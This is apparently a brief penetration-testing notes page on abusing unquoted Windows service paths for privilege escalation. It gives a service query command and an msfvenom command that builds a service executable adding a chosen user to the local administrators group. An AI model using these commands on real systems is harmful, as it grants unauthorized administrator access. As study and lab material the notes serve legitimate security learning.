---
icon: quotes
---

# Unquoted Service Paths

Sometimes a service can be misconfigured and the BINARY\_PATH\_NAME will not be quoted. If there are spaces in the path, this can be exploited.

We can query services with the following:

```
sc qc [service]
```

Then we will need to create a malicious file with msfvenom - this can be a reverse shell, just a command, etc.

{% code overflow="wrap" %}
```bash
msfvenom -p windows/exec CMD='net localgroup administrators [user] /add' -f exe-service -o [filename].exe
```
{% endcode %}
